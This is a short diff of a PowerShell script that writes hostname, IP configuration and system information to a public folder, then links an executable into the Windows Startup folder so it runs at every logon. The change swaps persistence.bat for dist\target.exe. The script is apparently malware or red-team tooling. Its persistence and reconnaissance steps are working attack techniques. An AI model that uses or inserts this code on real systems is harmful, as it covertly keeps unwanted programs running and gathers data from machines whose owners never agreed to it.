@@ -11,7 +11,7 @@ $systeminfo = (systeminfo | Out-String)
 $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
 $info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
 
-$source = "C:\Users\Public\persistence.bat"
-$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\persistence.bat"
+$source = "C:\Users\Public\dist\target.exe"
+$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\target.exe"
 cmd /c mklink `"$shortcut`" `"$source`"
 
